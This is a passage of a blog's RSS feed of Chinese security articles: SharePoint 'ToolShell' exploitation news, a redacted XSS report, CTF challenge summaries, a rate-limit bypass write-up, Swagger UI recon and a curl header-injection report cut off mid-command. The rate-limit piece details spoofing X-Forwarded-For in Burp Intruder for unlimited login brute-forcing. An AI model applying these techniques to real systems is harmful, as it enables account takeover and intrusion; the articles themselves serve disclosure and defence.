&lt;p&gt;这个被称为&amp;quot;ToolShell&amp;quot;的攻击链可以让攻击者完全控制组织内部本地运行的Microsoft SharePoint Server。不过，该攻击不适用于Microsoft 365版本的SharePoint Online。&lt;/p&gt;
&lt;h2 id=&#34;cve-2025-53770的全球大规模利用&#34;&gt;CVE-2025-53770的全球大规模利用
&lt;/h2&gt;&lt;p&gt;在微软7月19日披露时还没有补丁的CVE-2025-53770被广泛利用的报告在上周末出现。《华盛顿邮报》7月20日报道称，攻击者已经利用该漏洞&amp;quot;入侵了美国联邦和州政府机构、大学、能源公司和一家亚洲电信公司&amp;quot;，援引了州官员和私人研究人员的话。美国网络安全和基础设施安全局(CISA)也拉响警报，昨天将CVE-2025-53770添加到其已知被利用漏洞目录中，并建议组织立即采取措施进行缓解。&lt;/p&gt;
&lt;p&gt;根据微软针对CVE-2025-53770的安全公告，微软已经发布了&amp;quot;安全更新，完全保护使用SharePoint订阅版和SharePoint 2019的客户免受CVE-2025-53770和CVE-2025-53771带来的风险&amp;quot;。这些更新包括针对Microsoft SharePoint订阅版和SharePoint 2019的补丁，还为CVE-2025-49704和CVE-2025-49706提供了更强大的保护。&lt;/p&gt;
&lt;p&gt;&amp;ldquo;客户应立即应用这些更新以确保受到保护，&amp;ldquo;该公司表示，并补充说它正在为支持的SharePoint 2019和SharePoint 2016版本开发安全更新，建议这些客户定期查看以获取更多信息。&lt;/p&gt;
&lt;p&gt;虽然没有关于攻击责任方的确切信息，但根据Ontinue ATO的帖子，威胁情报表明中国的Silk Typhoon或Storm-0506(又名Black Basta)等组织可能参与其中。&lt;/p&gt;
&lt;h2 id=&#34;面临风险的sharepoint服务器&#34;&gt;面临风险的SharePoint服务器
&lt;/h2&gt;&lt;p&gt;这个漏洞的问题似乎源于德国进攻性安全组织Code White Gmbh在社交媒体平台X上的一篇随意帖子，该帖子演示了针对SharePoint的未经身份验证的RCE攻击链，结合了5月在柏林Pwn2Own会议上披露的两个漏洞。这两个漏洞——一个是被追踪为CVE-2025-49704的代码注入漏洞，另一个是被追踪为CVE-2025-49706的身份验证漏洞——是由Viettel网络安全的研究员Dinh Ho Anh Khoa发现的。&lt;/p&gt;
&lt;p&gt;根据CISA和微软的说法，CVE-2025-53770是CVE-2025-49706的一个变种。&lt;/p&gt;
&lt;p&gt;攻击的最初迹象出现在7月18日星期五晚上，当时Eye Security的研究人员注意到大规模主动利用，他们在全球扫描了8000多台SharePoint服务器后，发现&amp;quot;数十个系统在那天晚上和第二天被主动入侵&amp;rdquo;，他们在7月19日发布的博客文章中写道。&lt;/p&gt;
&lt;p&gt;他们观察到的攻击涉及&amp;quot;一个经典的web shell，在自定义路径中的混淆代码，旨在通过HTTP允许远程命令执行&amp;rdquo;，根据Eye Security的帖子。&lt;/p&gt;
&lt;p&gt;起初，研究人员认为他们看到的是对Active Directory Federation Services (ADFS)的暴力破解或凭据填充攻击，随后是使用有效凭据的认证上传或远程代码尝试。&amp;ldquo;受影响的SharePoint服务器暴露在互联网上，并使用混合ADFS与Azure AD绑定，&amp;ldquo;他们写道。&amp;ldquo;当配置错误或过时时，这种堆栈可能是一个危险的组合。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;识别toolshell攻击&#34;&gt;识别ToolShell攻击
&lt;/h2&gt;&lt;p&gt;最终，研究人员进行了一些挖掘，发现了Code White的ToolShell X帖子，当时这被认为是一个概念验证(PoC)，没有公开代码或明确的漏洞利用细节。他们很快意识到这正是他们观察到的攻击向量——它本身与另一个SharePoint漏洞CVE-2021-28474之前的攻击向量相似。&lt;/p&gt;
&lt;p&gt;在之前的攻击向量中，&amp;ldquo;攻击者滥用SharePoint页面中的服务器端控制解析逻辑，将意外对象注入页面生命周期，&amp;ldquo;根据Eye Security的说法。&lt;/p&gt;
&lt;p&gt;研究人员表示，这是可能的，因为SharePoint使用存储在机器配置中的签名密钥(即ValidationKey)加载和执行ASP.NET ViewState对象。&amp;ldquo;通过精心构造带有序列化payload的恶意页面请求，并正确签名，攻击者可以使SharePoint反序列化任意对象并执行嵌入的命令，&amp;ldquo;根据帖子。&amp;ldquo;然而，漏洞利用受到生成有效签名的要求的限制，这反过来需要访问服务器的秘密ValidationKey。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;研究人员解释说，在ToolShell链中，攻击者似乎直接从内存或配置中提取ValidationKey。&amp;ldquo;一旦这些加密材料泄露，攻击者就可以使用一个名为ysoserial的工具制作完全有效的、已签名的__VIEWSTATE payload，&amp;ldquo;这使得攻击者可以为RCE生成自己的有效SharePoint令牌，根据帖子。&lt;/p&gt;
&lt;p&gt;&amp;ldquo;这些payload可以嵌入任何恶意命令，并被服务器作为可信输入接受，完成RCE链而不需要凭据，&amp;ldquo;根据Eye Security的说法。&amp;ldquo;这反映了2021年被利用的设计弱点，但现在打包成了一个现代的零日链，具有自动shell投放、完全持久性和零认证。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;其他缓解措施&#34;&gt;其他缓解措施
&lt;/h2&gt;&lt;p&gt;最新的零日攻击标志着微软又一次受挫，去年国家行为者Midnight Blizzard入侵微软企业电子邮件账户并在此过程中窃取了联邦机构的凭据后，该公司面临越来越多的审查，这促使CISA发布了紧急指令。联邦网络安全审查委员会在一份期待已久的报告中随后的发现发现，该公司也未能防止之前对其Microsoft Exchange Online环境的单独黑客攻击，引发了对该供应商的新一波批评。&lt;/p&gt;
&lt;p&gt;安全研究人员表示，不应低估对SharePoint的更多攻击的可能性，并建议组织立即对所有易受攻击的系统应用缓解措施。SharePoint被大大小小的组织广泛用于业务文档共享，因此由于攻击者可以通过访问实例获取敏感信息，它成为威胁行为者的热门攻击向量。事实上，ToolShell让人想起去年秋天PoC发布后对另一个反序列化漏洞CVE-2024-38094的广泛利用。&lt;/p&gt;
&lt;p&gt;微软表示，它仍在为SharePoint 2016开发补丁。对于无法立即应用CVE-2025-53770和CVE-2025-53771修复程序或正在运行SharePoint 2016的组织，该公司建议采取其他快速行动进行缓解。&lt;/p&gt;
&lt;p&gt;这些行动包括部署Defender for Endpoint以检测漏洞利用后的活动，确保在本地SharePoint Server中集成AMSI，并在所有SharePoint主机上启用Microsoft Defender Antivirus。此外，微软表示，如果无法启用AMSI，组织应完全将易受攻击的系统与互联网断开连接，直到他们能够完全修补系统。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>██████网站customerId参数反射型XSS漏洞技术分析</title>
        <link>http://localhost:1313/p/%E7%BD%91%E7%AB%99customerid%E5%8F%82%E6%95%B0%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 22:31:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BD%91%E7%AB%99customerid%E5%8F%82%E6%95%B0%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;网站customerid参数反射型xss漏洞&#34;&gt;██████网站customerId参数反射型XSS漏洞
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h2&gt;&lt;p&gt;在██████网站发现一个反射型跨站脚本(XSS)漏洞，该漏洞位于customerId参数中。由于该参数在HTTP响应返回用户前未经过充分净化处理，当参数被恶意JavaScript代码操纵时，注入的脚本会在用户浏览器上下文中执行。&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;p&gt;漏洞利用的关键在于&lt;code&gt;oncontentvisibilityautostatechange&lt;/code&gt;事件属性未被应用程序正确过滤或编码。攻击者可以构造包含JavaScript payload的恶意URL，当受害者访问该URL时，payload将被执行。&lt;/p&gt;
&lt;p&gt;经确认该漏洞在Chrome浏览器中可成功利用，但在Firefox中不可行，这表明可能存在浏览器特定的过滤器绕过机制。&lt;/p&gt;
&lt;h2 id=&#34;漏洞验证&#34;&gt;漏洞验证
&lt;/h2&gt;&lt;p&gt;测试人员通过构造特殊格式的customerId参数成功复现了该漏洞，证实攻击者能够：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;注入任意JavaScript代码&lt;/li&gt;
&lt;li&gt;在受害者浏览器上下文执行&lt;/li&gt;
&lt;li&gt;窃取用户敏感信息或执行其他恶意操作&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2025年5月5日：漏洞首次提交&lt;/li&gt;
&lt;li&gt;2025年5月5日：漏洞等级从高危调整为中危(5.6分)&lt;/li&gt;
&lt;li&gt;2025年6月-7月：经过多次复测验证&lt;/li&gt;
&lt;li&gt;2025年7月1日：漏洞被标记为已修复&lt;/li&gt;
&lt;li&gt;2025年7月28日：漏洞报告公开披露&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞分类&#34;&gt;漏洞分类
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;弱点类型：反射型跨站脚本(XSS)&lt;/li&gt;
&lt;li&gt;CVE编号：暂无&lt;/li&gt;
&lt;li&gt;严重等级：中危(5.6)&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Trail of Bits深度参与CSAW网络安全竞赛：五大CTF挑战详解</title>
        <link>http://localhost:1313/p/trail-of-bits%E6%B7%B1%E5%BA%A6%E5%8F%82%E4%B8%8Ecsaw%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E4%BA%94%E5%A4%A7ctf%E6%8C%91%E6%88%98%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Sun, 03 Aug 2025 19:41:40 +0800</pubDate>
        
        <guid>http://localhost:1313/p/trail-of-bits%E6%B7%B1%E5%BA%A6%E5%8F%82%E4%B8%8Ecsaw%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E4%BA%94%E5%A4%A7ctf%E6%8C%91%E6%88%98%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;h3 id=&#34;我们与csaw的特殊情缘&#34;&gt;我们与CSAW的特殊情缘
&lt;/h3&gt;&lt;p&gt;在接下来的几周内，全球数万名学生和专业人士将关注六项竞赛，为他们喜爱的队伍加油助威。这就是我们长期参与的&amp;quot;网络安全意识周&amp;quot;(CSAW)——全美规模最大的学生运营网络安全赛事。无论多忙，我们始终会抽时间助力赛事成功。&lt;/p&gt;
&lt;h3 id=&#34;ctf挑战的技术贡献&#34;&gt;CTF挑战的技术贡献
&lt;/h3&gt;&lt;p&gt;今年我们为资格赛设计了五个CTF挑战：&lt;/p&gt;
&lt;h4 id=&#34;wyvern&#34;&gt;wyvern
&lt;/h4&gt;&lt;p&gt;参赛者首先获得一个经过混淆的Linux二进制文件（即crackme）。通过LLVM实现的多层次虚假谓词插入、代码扩散和基本块分割等混淆技术，使得静态逆向分析变得极其困难。参赛者必须采用动态分析方法，使用程序分析工具暴力破解flag。在此过程中，他们将学习如何通过监控指令计数变化来泄漏程序执行路径，以及使用PIN、Angr或AFL等工具。&lt;/p&gt;
&lt;h4 id=&#34;bricks-of-gold&#34;&gt;bricks of gold
&lt;/h4&gt;&lt;p&gt;这个挑战始于一个国际谜题：&amp;ldquo;我们截获了一份走私入境的加密文件，只知道他们使用了自定义的CBC模式算法——很可能很糟糕。&amp;ldquo;参赛者需要成功解密这个自定义XOR-CBC加密文件，这要求他们找出算法、密钥和初始向量。解题过程涉及文件头分析、密码学知识和暴力破解技术，同时学习如何检测加密文件的低熵特征、未加密字符串和CBC模式块特征。&lt;/p&gt;
&lt;h4 id=&#34;sharpturn&#34;&gt;sharpturn
&lt;/h4&gt;&lt;p&gt;参赛者获得一个损坏的Git仓库存档，需要修复损坏并读取文件。实际上存在三处损坏：每处都是单个比特错误且都位于源代码文件中（这是Trail of Bits真实遇到过的情况）。修复后，源代码文件可编译成包含答案的二进制文件。参赛者将学习Git blob包含带头部信息和zlib压缩的仓库文件版本，以及如何利用Git版本控制信息重建损坏的提交。&lt;/p&gt;
&lt;h4 id=&#34;punchout&#34;&gt;punchout
&lt;/h4&gt;&lt;p&gt;题目提供三个来自IBM System/360穿孔卡的二进制数据块及其加密数据。这些卡片使用1965年的加密技术，要求参赛者研究当时的安全机制。他们会遇到KW-26等密码（生成长比特流并与明文进行XOR运算），以及IBM使用的ebcdic（非ascii）编码方式。由于相同比特流被用于加密每个数据块，这种密钥重用存在已知攻击方式，参赛者需要通过&amp;quot;crib dragging&amp;quot;技术实施攻击。&lt;/p&gt;
&lt;h4 id=&#34;math-aside-were-all-blackhats-now&#34;&gt;&amp;ldquo;math aside, we&amp;rsquo;re all blackhats now&amp;rdquo;
&lt;/h4&gt;&lt;p&gt;参赛者需要找出为电视剧《硅谷》提供咨询的安全行业专家。该剧前两季中出现了大量与CTF社区相关的道具、名称和引用，其安全相关情节的准确性令人惊讶。&lt;/p&gt;
&lt;h3 id=&#34;其他技术相关内容&#34;&gt;其他技术相关内容
&lt;/h3&gt;&lt;h4 id=&#34;政策竞赛设计&#34;&gt;政策竞赛设计
&lt;/h4&gt;&lt;p&gt;我们协助CSAW设计了政策竞赛环节，挑战学生探索美国政府实施漏洞赏金计划的可行性方案。参赛作品由该争议性话题各方的专家小组评审，前五名团队将在CSAW现场展示提案。&lt;/p&gt;
&lt;h4 id=&#34;技术传承&#34;&gt;技术传承
&lt;/h4&gt;&lt;p&gt;我们有多名员工曾作为学生参加CSAW比赛，包括通过CSAW女性夏季项目结识的实习生Loren。今年共有1,367支队伍获得积分，创下赛事新纪录。所有历史CTF挑战题均已开源在Github。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>从429到200：利用X-Overwriting头实现速率限制绕过与漏洞赏金</title>
        <link>http://localhost:1313/p/%E4%BB%8E429%E5%88%B0200%E5%88%A9%E7%94%A8x-overwriting%E5%A4%B4%E5%AE%9E%E7%8E%B0%E9%80%9F%E7%8E%87%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E4%B8%8E%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91/</link>
        <pubDate>Sun, 03 Aug 2025 14:11:57 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BB%8E429%E5%88%B0200%E5%88%A9%E7%94%A8x-overwriting%E5%A4%B4%E5%AE%9E%E7%8E%B0%E9%80%9F%E7%8E%87%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E4%B8%8E%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91/</guid>
        <description>&lt;h1 id=&#34;从429到200利用x-overwriting头实现速率限制绕过与漏洞赏金&#34;&gt;从429到200：利用X-Overwriting头实现速率限制绕过与漏洞赏金
&lt;/h1&gt;&lt;p&gt;Akwaaba！朋友们。在本报告中，我将展示如何绕过某组织匆忙实施的速率限制机制。如果你对我的其他研究感兴趣，可以参考我之前关于《如何绕过Google验证码实现CSRF与XSS链式攻击》的文章，或者关于《Android Intent重定向攻击》的移动端渗透测试文章。&lt;/p&gt;
&lt;h2 id=&#34;速率限制技术解析&#34;&gt;速率限制技术解析
&lt;/h2&gt;&lt;p&gt;速率限制是开发者用来控制用户/系统在特定时间范围内请求次数的技术。在API中，标准响应状态码为429（请求过多），但许多开发者会采用非标准实现。常见实现方式包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于IP地址的限制&lt;/li&gt;
&lt;li&gt;基于电子邮件的限制&lt;/li&gt;
&lt;li&gt;基于设备/会话的限制&lt;/li&gt;
&lt;li&gt;基于地理位置的限制&lt;/li&gt;
&lt;li&gt;端点专用限制等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如微软会在多次错误登录后给予冷却期，而Snapchat则会直接临时锁定账户。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;在某HackerOne项目的测试中，我最初发现其应用存在速率限制缺失问题。在厂商修复后，我重新检测登录端点发现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;5次错误登录触发429状态码&lt;/li&gt;
&lt;li&gt;响应体中包含用户公网IP参数&lt;/li&gt;
&lt;li&gt;确认采用IP基础的计数机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用x-overwriting头绕过&#34;&gt;利用X-Overwriting头绕过
&lt;/h2&gt;&lt;p&gt;为绕过IP限制，除了VPN切换外，更有效的方法是使用下列HTTP覆盖头：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;X-HTTP-Method-Override&lt;/code&gt;：覆盖HTTP方法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;X-Original-URL/X-Rewrite-URL&lt;/code&gt;：URL重写&lt;/li&gt;
&lt;li&gt;&lt;code&gt;X-Forwarded-For&lt;/code&gt;：声明原始客户端IP&lt;/li&gt;
&lt;li&gt;&lt;code&gt;X-Real-IP&lt;/code&gt;：替代IP传递方式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过Burp Suite测试：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;注入&lt;code&gt;X-Forwarded-For: 127.0.0.1&lt;/code&gt;头&lt;/li&gt;
&lt;li&gt;观察到状态码从429变为401&lt;/li&gt;
&lt;li&gt;响应体显示伪造IP与剩余尝试次数&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;自动化暴力破解配置&#34;&gt;自动化暴力破解配置
&lt;/h2&gt;&lt;p&gt;使用Burp Intruder进行自动化攻击：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;采用Sniper攻击模式&lt;/li&gt;
&lt;li&gt;对IP地址某个字节设置数字载荷（1-500）&lt;/li&gt;
&lt;li&gt;每个请求自动变更X-Forwarded-For值&lt;/li&gt;
&lt;li&gt;利用无效IP（如256+字节值）实现无限尝试&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防护方案建议&#34;&gt;防护方案建议
&lt;/h2&gt;&lt;p&gt;针对IP基础速率限制的防护措施：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;仅信任已知内部代理的X-Forwarded-For头&lt;/li&gt;
&lt;li&gt;优先使用网络层REMOTE_ADDR值&lt;/li&gt;
&lt;li&gt;在应用前置反向代理/WAF（如Cloudflare、AWS WAF）&lt;/li&gt;
&lt;li&gt;实施多因素速率限制策略（IP+会话+行为）&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;特别说明：本文所有技术细节已获得相关厂商授权披露，仅供学习防御技术使用。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;通过Twitter @tinopreter或LinkedIn Clement Osei-Somuah与我交流更多安全研究。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>通过Swagger UI进行钓鱼攻击——利用错误配置获取漏洞赏金</title>
        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87swagger-ui%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E8%8E%B7%E5%8F%96%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91/</link>
        <pubDate>Sun, 03 Aug 2025 13:55:41 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87swagger-ui%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E8%8E%B7%E5%8F%96%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91/</guid>
        <description>&lt;h1 id=&#34;通过swagger-ui进行钓鱼攻击利用错误配置获取漏洞赏金&#34;&gt;通过Swagger UI进行钓鱼攻击——利用错误配置获取漏洞赏金
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;Swagger UI是一个开源工具，帮助开发者可视化和交互由OpenAPI规范定义的API端点。虽然它对测试和文档非常有用，但暴露或错误配置的Swagger实例可能导致严重的安全问题，如DOM XSS、HTML注入和开放重定向。随着漏洞赏金平台对此类漏洞的奖励，保护Swagger UI不仅至关重要，也是道德黑客的宝贵目标。&lt;/p&gt;
&lt;h2 id=&#34;为什么swagger-ui可能很危险&#34;&gt;为什么Swagger UI可能很危险
&lt;/h2&gt;&lt;p&gt;问题不在于Swagger本身，而在于开发者部署它的方式——有时公开部署，有时包含敏感端点，并且经常没有身份验证和输入清理。常见问题包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在互联网上暴露Swagger UI，包含生产端点。&lt;/li&gt;
&lt;li&gt;文档缺乏访问控制。&lt;/li&gt;
&lt;li&gt;输入清理不当，允许XSS和HTML注入。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;侦察阶段寻找swagger-ui&#34;&gt;侦察阶段——寻找Swagger UI
&lt;/h2&gt;&lt;p&gt;使用Subfinder收集所有子域名。关键技巧如下：&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;subfinder -d example&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;com --all &amp;gt;&amp;gt; subs.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;总是寻找类似&lt;code&gt;grafana.example.com&lt;/code&gt;的子域名，如果你找到这样的子域名，那么你就走运了！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BadAlloc漏洞：内存分配漏洞可能影响工业、医疗和企业网络中的广泛IoT和OT设备</title>
        <link>http://localhost:1313/p/badalloc%E6%BC%8F%E6%B4%9E%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%BD%B1%E5%93%8D%E5%B7%A5%E4%B8%9A%E5%8C%BB%E7%96%97%E5%92%8C%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E5%B9%BF%E6%B3%9Biot%E5%92%8Cot%E8%AE%BE%E5%A4%87/</link>
        <pubDate>Sun, 03 Aug 2025 12:29:02 +0800</pubDate>
        
        <guid>http://localhost:1313/p/badalloc%E6%BC%8F%E6%B4%9E%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%BD%B1%E5%93%8D%E5%B7%A5%E4%B8%9A%E5%8C%BB%E7%96%97%E5%92%8C%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E5%B9%BF%E6%B3%9Biot%E5%92%8Cot%E8%AE%BE%E5%A4%87/</guid>
        <description>&lt;p&gt;微软Azure Defender for IoT安全研究团队Section 52最近发现了一系列存在于IoT和OT设备中的关键内存分配漏洞，攻击者可能利用这些漏洞绕过安全控制执行恶意代码或导致系统崩溃。&lt;/p&gt;
&lt;p&gt;这些远程代码执行(RCE)漏洞涉及超过25个CVE编号，潜在影响范围从消费级和医疗IoT到工业物联网(IIoT)、运营技术(OT)和工业控制系统。漏洞存在于广泛使用的实时操作系统(RTOS)、嵌入式软件开发套件(SDK)和C标准库(libc)实现的标准内存分配函数中。这些发现已通过微软安全响应中心(MSRC)和国土安全部(DHS)领导的责任披露流程与供应商共享，使供应商能够调查并修补漏洞。&lt;/p&gt;
&lt;p&gt;鉴于IoT和OT设备的普遍性，这些漏洞如果被成功利用，将对各类组织构成重大潜在风险。截至目前，微软尚未发现这些漏洞被利用的迹象。但我们强烈建议组织尽快修补系统。&lt;/p&gt;
&lt;p&gt;对于无法立即修补的设备，我们建议采取以下缓解措施：通过最小化或消除漏洞设备对互联网的暴露来减少攻击面；实施网络安全监控以检测入侵行为指标；加强网络分段以保护关键资产。&lt;/p&gt;
&lt;p&gt;&amp;ldquo;BadAlloc&amp;quot;是微软Section 52为嵌入式IoT和OT操作系统及软件中发现的内存溢出漏洞家族命名的名称。所有这些漏洞都源于使用易受攻击的内存函数，如malloc、calloc、realloc等。我们的研究表明，多年来作为IoT设备和嵌入式软件一部分编写的内存分配实现没有包含适当的输入验证。没有这些输入验证，攻击者可能利用内存分配函数执行堆溢出，从而在目标设备上执行恶意代码。&lt;/p&gt;
&lt;p&gt;我们建议拥有IoT和OT设备的组织采取以下缓解措施：
• 打补丁：按照供应商说明为受影响产品应用补丁
• 无法打补丁时进行监控：使用Azure Defender for IoT等IoT/OT感知的网络检测和响应(NDR)解决方案
• 通过消除OT控制系统的不必要互联网连接来减少攻击面
• 实施网络分段：使用防火墙将IoT设备和OT网络与企业IT网络隔离&lt;/p&gt;
&lt;p&gt;微软Section 52是Azure Defender for IoT的安全研究团队，由在IoT/OT威胁追踪、恶意软件逆向工程、事件响应和数据分析方面具有深厚专业知识的安全研究人员和数据科学家组成。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>curl漏洞报告：带空格前缀的-H参数与--proxy联用导致HTTP头注入</title>
        <link>http://localhost:1313/p/curl%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%B8%A6%E7%A9%BA%E6%A0%BC%E5%89%8D%E7%BC%80%E7%9A%84-h%E5%8F%82%E6%95%B0%E4%B8%8E--proxy%E8%81%94%E7%94%A8%E5%AF%BC%E8%87%B4http%E5%A4%B4%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Sun, 03 Aug 2025 11:24:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/curl%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E5%B8%A6%E7%A9%BA%E6%A0%BC%E5%89%8D%E7%BC%80%E7%9A%84-h%E5%8F%82%E6%95%B0%E4%B8%8E--proxy%E8%81%94%E7%94%A8%E5%AF%BC%E8%87%B4http%E5%A4%B4%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;h1 id=&#34;curl漏洞报告带空格前缀的-h参数与proxy联用导致http头注入&#34;&gt;curl漏洞报告：带空格前缀的-H参数与&amp;ndash;proxy联用导致HTTP头注入
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;报告人&lt;/strong&gt;: spongebhav&lt;br&gt;
&lt;strong&gt;提交时间&lt;/strong&gt;: 2024年11月25日&lt;br&gt;
&lt;strong&gt;影响版本&lt;/strong&gt;: curl 8.11.0 (macOS Sequoia 15.1)&lt;/p&gt;
&lt;h2 id=&#34;漏洞描述&#34;&gt;漏洞描述
&lt;/h2&gt;&lt;p&gt;当curl同时使用&lt;code&gt;-H &amp;quot;[space]header:value&amp;quot;&lt;/code&gt;和&lt;code&gt;--proxy&lt;/code&gt;参数时，会导致HTTP头注入到前一个头部字段中。该行为仅在启用代理时出现。&lt;/p&gt;
&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -X GET &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://example.com&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Secure-Header: XYZ&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;-H &lt;span class=&#34;s2&#34;&gt;&amp;#34; new-header-that-will-inject-to-previous-header: value&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
